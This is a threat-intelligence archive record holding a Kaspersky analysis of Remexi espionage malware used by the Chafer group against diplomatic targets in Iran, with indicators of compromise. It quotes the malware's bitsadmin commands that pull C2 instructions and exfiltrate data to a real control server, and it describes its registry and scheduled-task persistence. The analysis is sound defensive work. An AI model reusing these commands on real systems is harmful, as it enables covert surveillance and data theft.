{
    "id": "98b69e2e-6557-4848-9cf4-63b626e80cad",
    "created_at": "2022-10-25T16:48:12.761894Z",
    "updated_at": "2025-03-27T02:14:30.724257Z",
    "deleted_at": null,
    "sha1_hash": "9707e48b8b7bdca8d17e74292142a5a4dd344f64",
    "title": "Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities",
    "authors": "",
    "file_creation_date": "2019-02-12T07:29:40Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 95404,
    "plain_text": "# Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities\n\n**securelist.com/chafer-used-remexi-malware/89538**\n\nBy Denis Legezo\n\n## Executive Summary\n\nThroughout the autumn of 2018 we analyzed a long-standing (and still active at that\ntime) cyber-espionage campaign that was primarily targeting foreign diplomatic\nentities based in Iran. The attackers were using an improved version of Remexi in what\nthe victimology suggests might be a domestic cyber-espionage operation. This\nmalware has previously been associated with an APT actor that Symantec calls Chafer.\n\nThe malware can exfiltrate keystrokes, screenshots, browser-related data like cookies\nand history, decrypted when possible. The attackers rely heavily on Microsoft\ntechnologies on both the client and server sides: the Trojan uses standard Windows\nutilities like Microsoft Background Intelligent Transfer Service (BITS) bitsadmin.exe to\nreceive commands and exfiltrate data. Its C2 is based on IIS using .asp technology to\nhandle the victims’ HTTP requests.\n\nRemexi developers use the C programming language and GCC compiler on Windows\nin the MinGW environment. They most likely used the Qt Creator IDE in a Windows\nenvironment. The malware utilizes several persistence mechanisms including\nscheduled tasks, Userinit and Run registry keys in the HKLM hive.\n\nXOR and RC4 encryption is used with quite long unique keys for different samples.\nAmong all these random keys once the word “salamati” was also used, which means\n“health” in Farsi.\n\nKaspersky Lab products detect the malware described in this report as\nTrojan.Win32.Remexi and Trojan.Win32.Agent. This blogpost is based in our original\nreport shared with our APT Intelligence Reporting customers last November 2018. For\n[more information please contact: intelreports@kaspersky.com](mailto:intelreports@kaspersky.com)\n\n## Technical analysis\n\nThe main tool used in this campaign is an updated version of the Remexi malware,\n[publicly reported by Symantec back in 2015. The newest module’s compilation](https://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets)\ntimestamp is March 2018. The developers used GCC compiler on Windows in the\nMinGW environment.\n\nInside the binaries the compiler left references to the names of the C source file\nmodules used: “operation_reg.c”, “thread_command.c” and “thread_upload.c”. Like\nmentioned in modules file names the malware consists of several working threads\ndedicated to different tasks, including C2 command parsing and data exfiltration. For\n\n\n-----\n\nBackground Intelligent Transfer Service (BITS) mechanism to communicate with the C2\nover HTTP.\n\n### Proliferation\n\nSo far, our telemetry hasn’t provided any concrete evidence that shows us how the\nRemexi malware spread. However, we think it’s worth mentioning that for one victim\nwe found a correlation between the execution of Remexi´s main module and the\nexecution of an AutoIt script compiled as PE, which we believe may have dropped the\nmalware. This dropper used an FTP with hardcoded credentials to receive its payload.\nFTP server was not accessible any more at the time of our analysis.\n\n### Malware features\n\nRemexi boasts features that allow it to gather keystrokes, take screenshots of windows\nof interest (as defined in its configuration), steal credentials, logons and the browser\nhistory, and execute remote commands. Encryption consists of XOR with a hardcoded\nkey for its configuration and RC4 with a predefined password for encrypting the\nvictim’s data.\n\nRemexi includes different modules that it deploys in its working directory, including\nconfiguration decryption and parsing, launching victim activity logging in a separate\nmodule, and seven threads for various espionage and auxiliary functions. The Remexi\ndevelopers seem to rely on legitimate Microsoft utilities, which we enumerate in the\ntable below.\n\n**Utility** **Usage**\n\nextract.exe Deploys modules from the .cab file into the working Event Cache directory\n\nbitsadmin.exe Fetches files from the C2 server to parse and execute commands. Send\nexfiltrated data\n\ntaskkill.exe Ends working cycle of modules\n\n### Persistence\n\nPersistence modules are based on scheduled tasks and system registry. Mechanisms\nvary for different OS versions. In the case of old Windows versions like XP, main\nmodule events.exe runs an edited XPTask.vbs Microsoft sample script to create a\nweekly scheduled task for itself. For newer operating systems, events.exe creates\ntask.xml as follows:\n\nThen it creates a Windows scheduled task using the following command:\n\n1 ht k / t /TN \\\"E t \\\\C h T k < h >\" /XML \\\"t /F\"\n\n\n-----\n\nthe key:\n\nHKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\n\nwhen it finds possible add values to the Winlogon subkey, and in\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager.\nAll such indicators of comprometation are mentioned in correspondent appendix\nbelow.\n\n### Commands\n\nAll the commands received from the C2 are first saved to an auxiliary file and then\nstored encrypted in the system registry. The standalone thread will decrypt and\nexecute them.\n\n**Command** **Description**\n\nsearch Searches for corresponding files\n\nsearch&upload Encrypts and adds the corresponding files to the upload directory with the\nprovided name\n\nuploadfile Encrypts and adds the specified file to the upload directory with the provided\nname\n\nuploadfolder Encrypts and adds the mentioned directory to the upload directory with the\nprovided name\n\nshellexecute Silently executes received command with cmd.exe\n\nwmic Silently executes received command with wmic.exe (for WMI commands)\n\nsendIEPass Encrypts and adds all gathered browser data into files for upload to C2\n\nuninstall Removes files, directory and BITS tasks\n\n### Cryptography\n\nTo decrypt the configuration data, the malware uses XOR with 25-character keys such\nas “waEHleblxiQjoxFJQaIMLdHKz” that are different for every sample. RC4 file\nencryption relies on the Windows 32 CryptoAPI, using the provided value’s MD5 hash\nas an initial vector. Among all these random keys once the word “salamati” was also\nused, which means “health” in Farsi.\n\n### Configuration\n\nConfig.ini is the file where the malware stores its encrypted configuration data. It\ncontains the following fields:\n\n**Field** **Sample value** **Description**\n\n\n-----\n\nthreshold. It will be deleted if it\nbecomes as large as the free available\nspace multiplied by this ratio\n\ncaptureScreenTimeOut 72 Probability of full and active window\nscreenshots being taken after mouse\ncaptureActiveWindowTimeOut 313 click\n\ncaptureScreenQC 40 Not really used. Probably full and active\nwindow screenshot quality\ncaptureActiveQC 40\n\n\nCaptureSites VPN*0,0\nLogin*0,0\nmail*0,0\nSecurity*0,0\n\nimportant upLog.txt\nupSCRLog.txt\nupSpecial.txt\nupFile.txt\nupMSLog.txt\n\n\nWindow titles of interest for\nscreenshots, using left mouse button\nand Enter keypress hook\n\nList of files to send to C2 using\nbitsadmin.exe from the dedicated\nthread\n\n\nmaxUpFileSizeKByte 1000000 Maximum size of file uploaded to C2\n\nServers http://108.61.189.174 Control server HTTP URL\n\nZipPass KtJvOXulgibfiHk Password for uploaded zip archives\n\nbrowserPasswordCheckTimeout 300000 Milliseconds to wait between gathering\nkey3.db, cookies.sqlite and other\nbrowser files in dedicated thread\n\nMost of the parameters are self-explanatory. However, captureScreenTimeOut and\ncaptureActiveWindowTimeOut are worth describing in more detail as their\nprogramming logic is not so intuitive.\n\nOne of the malware threads checks in an infinite loop if the mouse button was pressed\nand then also increments the integer iterator infinitely. If the mouse hooking function\nregisters a button hit, it lets the screenshotting thread know about it through a global\nvariable. After that, it checks if the iterator divided by\n(captureScreenTimeOut/captureActiveWindowTimeOut) has a remainder of 0. In that\ncase, it takes a screenshot.\n\n### Main module (events.exe)\n\n**SHA256** b1fa803c19aa9f193b67232c9893ea57574a2055791b3de9f836411ce000ce31\n\n**MD5** c981273c32b581de824e1fd66a19a281\n\n**Compiled** GCC compiler in MinGW environment version 2.24, timestamp set to 1970 by\ncompiler\n\nd\n\n\n-----\n\nAfter checking that the malware is not already installed, it unpacks HCK.cab using the\nMicrosoft standard utility expand.exe with the following arguments:\n\n1 expand.exe -r \\\"<full path to HCK.cab>\\\" -f:* \\\"<event_cache_dir_path>\\\\\\\"\n\nThen it decrypts config.ini file with a hardcoded 25-byte XOR key that differs for every\nsample. It sets keyboard and mouse hooks to its handlekeys() and MouseHookProc()\nfunctions respectively and starts several working threads:\n\n**ID** **Thread description**\n\n1 Gets commands from C2 and saves them to a file and system registry using the\nbitsadmin.exe utility\n\n2 Decrypts command from registry using RC4 with a hardcoded key, and executes it\n\n3 Transfers screenshots from the clipboard to \\Cache005 subdirectory and Unicode text from\nclipboard to log.txt, XOR-ed with the “salamati” key (“health” in Farsi)\n\n4 Transfers screenshots to \\Cache005 subdirectory with captureScreenTimeOut and\ncaptureScreenTimeOut frequencies\n\n5 Checks network connection, encrypts and sends gathered logs\n\n6 Unhooks mouse and keyboard, removes bitsadmin task\n\n7 Checks if malware’s working directory size already exceeds its threshold\n\n8 Gathers victim´s credentials, visited website cache, decrypted Chrome login data, as well as\nFirefox databases with cookies, keys, signons and downloads\n\nThe malware uses the following command to receive data from its C2:\n\n\n1\n2\n\n\nbitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal <server>\n<file>\nhttp:///asp.asp?ui=nrg-\n\n### Activity logging module (Splitter.exe)\n\nThis module is called from the main thread to obtain screenshots of windows whose\ntitles are specified in the configuration CaptureSites field, bitmaps and text from\nclipboard, etc.\n\n**SHA256** a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff\n\n**MD5** 1ff40e79d673461cd33bd8b68f8bb5b8\n\n**Compiled** 2017.08.06 11:32:36 (GMT), 2.22\n\n**Type** I386 Windows Console EXE\n\n**Size** 101 888\n\n\n-----\n\nwith its corresponding exported functions, the developers decided to use a standalone\nexecutable started by events.exe with the following parameters:\n\n**Parameter** **Description**\n\n-scr Screenshot file name to save in Cache006 subdirectory, zipped with password from\nconfiguration. Can capture all screen (“AllScreen”) or the active window\n(“ActiveWindow”)\n\n-ms Screenshot file name to save in Cache006 subdirectory, zipped with password from\nconfiguration. Specifies the screen coordinates to take\n\n-zip Name of password (from configuration data) protected zip archive\n\n-clipboard Screenshot file name where a bitmap from the clipboard is saved in Cache005\nsubdirectory, zipped with password from configuration\n\n### Data exfiltration\n\n[Exfiltration is done through the bitsadmin.exe utility. The BITS mechanism has existed](https://docs.microsoft.com/en-us/windows/desktop/Bits/bitsadmin-tool)\nsince Windows XP up to the current Windows 10 versions and was developed to create\ndownload/upload jobs, mostly to update the OS itself. The following is the command\nused to exfiltrate data from the victim to the C2:\n\n1 bitsadmin.exe /TRANSFER HelpCenterUpload /UPLOAD /PRIORITY normal \"/YP01__\" \"\"\n\n## Victims\n\nThe vast majority of the users targeted by this new variant of Remexi appear to have\nIranian IP addresses. Some of these appear to be foreign diplomatic entities based in\nthe country.\n\n## Attribution\n\nThe Remexi malware has been associated with an APT actor called [Chafer by](https://www.securityweek.com/iran-linked-chafer-group-expands-toolset-targets-list)\nSymantec.\n\nOne of the human-readable encryption keys used is “salamati”. This is probably the\nLatin spelling for the word “health” in Farsi. Among the artifacts related to malware\nauthors, we found in the binaries a .pdb path containing the Windows user name\n“Mohamadreza New”. Interestingly, the FBI website for wanted cybercriminals includes\n[two Iranians called Mohammad](https://www.fbi.gov/wanted/cyber/mohammed-reza-sabahi) [Reza, although this could be a common name or even](https://www.fbi.gov/wanted/cyber/mohammad-reza-rezakhah)\na false flag.\n\n## Conclusions\n\nActivity of the Chafer APT group has been observed since at least 2015, but based on\nthings like compilation timestamps and C&C registration, it’s possible they have been\n\n\n-----\n\nWe will continue to monitor how this set of activity develops in the future.\n\n## Indicators of compromise\n\n### File hashes\n\n**events.exe**\n028515d12e9d59d272a2538045d1f636\n03055149340b7a1fd218006c98b30482\n25469ddaeff0dd3edb0f39bbe1dcdc46\n41b2339950d50cf678c0e5b34e68f537\n4bf178f778255b6e72a317c2eb8f4103\n7d1efce9c06a310627f47e7d70543aaf\n9f313e8ef91ac899a27575bc5af64051\naa6246dc04e9089e366cc57a447fc3a4\nc981273c32b581de824e1fd66a19a281\ndcb0ea3a540205ad11f32b67030c1e5a\n\n**splitter.exe**\nc6721344af76403e9a7d816502dca1c8\nd3a2b41b1cd953d254c0fc88071e5027\n1FF40E79D673461CD33BD8B68F8BB5B8\necae141bb068131108c1cd826c82d88b\n12477223678e4a41020e66faebd3dd95\n460211f1c19f8b213ffaafcdda2a7295\n53e035273164f24c200262d61fa374ca\n\n### Domains and IPs\n\n108.61.189.174\n\n### Hardcoded mutexes\n\nLocal\\TEMPDAHCE01\nLocal\\zaapr\nLocal\\reezaaprLog\nLocal\\{Temp-00-aa-123-mr-bbb}\n\n### Scheduled task\n\nCacheTask_\n\n### Directory with malicious modules\n\nMain malware directory: %APPDATA%\\Microsoft\\Event Cache\nCommands from C2 in subdirectory: Cache001\\cde00.acf\n\n\n-----\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Activity Manager\n\n### Victims’ fingerprints stored in\n\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\PidRegData or\nHKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\PidRegData\n\n### RC4 encrypted C2 commands stored in\n\nHKCU\\SOFTWARE\\Microsoft\\Fax\n\n### HTTP requests template\n\nhttp:///asp.asp?ui=nrg-And bitsadmin.exe task to external network resources, addressed by IP addresses\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.01.30.Chafer_APT_Spy_Iran/Chafer%20used%20Remexi%20malware%20to%20spy%20on%20Iran-based%20foreign%20diplomatic%20entities.pdf"
    ],
    "report_names": [
        "Chafer used Remexi malware to spy on Iran-based foreign diplomatic entities"
    ],
    "threat_actors": [
        {
            "id": "bee22874-f90e-410b-93f3-a2f9b1c2e695",
            "created_at": "2022-10-25T16:07:23.45097Z",
            "updated_at": "2025-03-27T02:02:09.808919Z",
            "deleted_at": null,
            "main_name": "Chafer",
            "aliases": [
                "APT 39",
                "Cobalt Hickman",
                "ITG07",
                "Radio Serpens",
                "Remix Kitten",
                "TA454"
            ],
            "source_name": "ETDA:Chafer",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Antak",
                "CACHEMONEY",
                "EternalBlue",
                "HTTPTunnel",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MechaFlounder",
                "Metasploit",
                "Mimikatz",
                "NBTscan",
                "NSSM",
                "Non-sucking Service Manager",
                "POWBAT",
                "Plink",
                "PuTTY Link",
                "Rana",
                "Remcom",
                "Remexi",
                "RemoteCommandExecution",
                "SafetyKatz",
                "UltraVNC",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "nbtscan",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a761f2a6-26ba-47fd-89c3-6a74f847a3b2",
            "created_at": "2024-05-01T02:03:08.025289Z",
            "updated_at": "2025-03-27T02:05:17.312292Z",
            "deleted_at": null,
            "main_name": "COBALT HICKMAN",
            "aliases": [
                "Chafer ",
                "ITG07 ",
                "APT39 "
            ],
            "source_name": "Secureworks:COBALT HICKMAN",
            "tools": [
                " Mimikatz",
                " Remexi",
                " TREKX",
                "MechaFlounder"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "6b6155e4-94ec-4909-b908-550afe758ad6",
            "created_at": "2022-10-25T15:50:23.365074Z",
            "updated_at": "2025-03-27T02:00:55.455014Z",
            "deleted_at": null,
            "main_name": "APT39",
            "aliases": [
                "APT39",
                "ITG07",
                "Remix Kitten"
            ],
            "source_name": "MITRE:APT39",
            "tools": [
                "NBTscan",
                "MechaFlounder",
                "Remexi",
                "CrackMapExec",
                "pwdump",
                "Mimikatz",
                "Windows Credential Editor",
                "Cadelspy",
                "PsExec",
                "ASPXSpy",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041670,
    "ts_creation_date": 1549956580,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/9707e48b8b7bdca8d17e74292142a5a4dd344f64.pdf",
        "text": "https://archive.orkl.eu/9707e48b8b7bdca8d17e74292142a5a4dd344f64.txt",
        "img": "https://archive.orkl.eu/9707e48b8b7bdca8d17e74292142a5a4dd344f64.jpg"
    }
}